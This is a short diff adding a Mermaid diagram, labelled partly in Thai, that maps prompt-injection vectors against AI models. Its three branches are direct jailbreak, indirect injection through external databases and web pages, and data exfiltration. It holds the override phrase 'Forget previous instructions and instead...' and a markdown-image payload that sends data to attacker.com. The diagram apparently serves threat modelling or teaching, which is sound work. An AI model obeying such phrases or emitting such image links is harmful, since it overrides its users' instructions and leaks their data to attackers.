@@ -1,0 +1,8 @@
+graph TD
+    A[Prompt Injection Vectors] --> B[Direct Injection / Jailbreak]
+    A --> C[Indirect Injection / ภัยมืดแฝงตัว]
+    A --> D[Data Exfiltration / การลักลอบดูดข้อมูล]
+    
+    B --> B1["'Forget previous instructions and instead...'" ]
+    C --> C1["แฝง Payload ลงในฐานข้อมูล/เว็บภายนอก"]
+    D --> D1["ฉีด Markdown Image: ![]\(https://attacker.com/steal?data=...)"]
